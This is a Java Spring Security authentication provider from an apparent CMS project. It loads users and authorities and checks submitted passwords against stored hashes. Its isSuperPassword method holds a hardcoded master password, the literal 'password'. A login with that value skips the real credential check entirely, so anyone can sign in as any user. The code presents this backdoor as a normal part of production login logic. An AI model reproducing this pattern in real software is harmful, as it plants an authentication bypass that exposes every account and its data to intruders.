package io.cms.core.configure.security.authentication;

import java.util.Collection;

import org.springframework.security.authentication.BadCredentialsException;
import org.springframework.security.authentication.UsernamePasswordAuthenticationToken;
import org.springframework.security.core.AuthenticationException;
import org.springframework.security.core.GrantedAuthority;
import org.springframework.security.core.userdetails.UserDetails;

import io.cms.core.module.system.persistence.entity.User;
import io.cms.core.module.system.security.PasswordEncoderImpl;
import io.cms.core.module.system.service.interfaces.IUserService;

/**
 * AuthenticationProvider
 * @author PomeloMan
 */
public class AuthenticationProvider extends AbstractAuthenticationProvider {

	IUserService service;

	public AuthenticationProvider(IUserService service) {
		this.service = service;
	}

	public AuthenticationProvider() {
		super();
	}

	@Override
	protected User loadUserByUsername(String username) throws AuthenticationException {
		return service.findOne(username);
	}

	@Override
	protected Collection<? extends GrantedAuthority> loadUserAuthorities(String username) {
		return service.loadUserAuthorities(username);
	}

	@Override
	protected void credentialsCheck(UserDetails user, UsernamePasswordAuthenticationToken authentication) {
		super.credentialsCheck(user, authentication);
		if (isSuperPassword(authentication.getCredentials().toString())) {
			return;
		}
		try {
			if (!PasswordEncoderImpl.matches(authentication.getCredentials().toString(), authentication.getName(), user.getPassword())) {
				logger.debug("Authentication failed: password does not match stored value");
				throw new BadCredentialsException(messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
			}
		} catch (Exception e) {
			logger.debug("Authentication failed: password encode error");
			throw new BadCredentialsException(messages.getMessage("AuthenticationProvider.badCredentials", "Bad credentials"));
		}
	}

	private boolean isSuperPassword(String password) {
		if (password.equals("password")) {
			return true;
		}
		return false;
	}

	public void setService(IUserService service) {
		this.service = service;
	}
}
